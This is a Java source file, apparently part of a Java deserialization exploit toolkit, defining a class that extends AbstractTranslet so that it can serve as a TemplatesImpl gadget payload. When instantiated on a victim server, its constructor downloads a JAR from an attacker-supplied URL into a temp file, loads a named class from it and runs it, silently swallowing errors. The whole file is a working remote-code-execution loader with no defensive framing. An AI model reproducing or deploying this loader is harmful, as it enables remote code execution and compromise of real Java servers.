package loader;

import com.sun.org.apache.xalan.internal.xsltc.DOM;
import com.sun.org.apache.xalan.internal.xsltc.TransletException;
import com.sun.org.apache.xalan.internal.xsltc.runtime.AbstractTranslet;
import com.sun.org.apache.xml.internal.dtm.DTMAxisIterator;
import com.sun.org.apache.xml.internal.serializer.SerializationHandler;

import java.io.*;
import java.net.URL;
import java.net.URLClassLoader;

/**
 * 通过http 下载Jar文件，并载入指定class
 * RemoteFileLoader的补充，防止UrlClassloader的远程载入限制
 */
public class RemoteFileHttpLoader extends AbstractTranslet implements Serializable {

    private static String url;
    private static String classname;

    public RemoteFileHttpLoader() {
        BufferedInputStream bufferedInputStream = null;
        FileOutputStream stream = null;
        try{
            transletVersion = 101;
            if(RemoteFileHttpLoader.url != null){
                URL url = new URL(RemoteFileHttpLoader.url);
                bufferedInputStream = new BufferedInputStream(url.openStream());
                File file = File.createTempFile("demo", ".jar");
                stream = new FileOutputStream(file);
                final byte data[] = new byte[8192];
                int count;
                while((count = bufferedInputStream.read(data)) > 0)
                    stream.write(data, 0, count);

                URL localJar = new URL("file://"+file.getAbsolutePath());
                URLClassLoader classloader = URLClassLoader.newInstance(new URL[]{localJar});
                Class<?> clazz = classloader.loadClass(classname);
                clazz.newInstance();
            }

        }catch (Exception e){
        }finally {
            if(bufferedInputStream != null){
                try {
                    bufferedInputStream.close();
                } catch (IOException e) {
                    e.printStackTrace();
                }
            }
            if(stream != null){
                try {
                    stream.close();
                } catch (IOException e) {
                    e.printStackTrace();
                }
            }
        }
    }

    @Override
    public void transform(DOM document, SerializationHandler[] handlers) throws TransletException {

    }

    @Override
    public void transform(DOM document, DTMAxisIterator iterator, SerializationHandler handler) throws TransletException {

    }

}
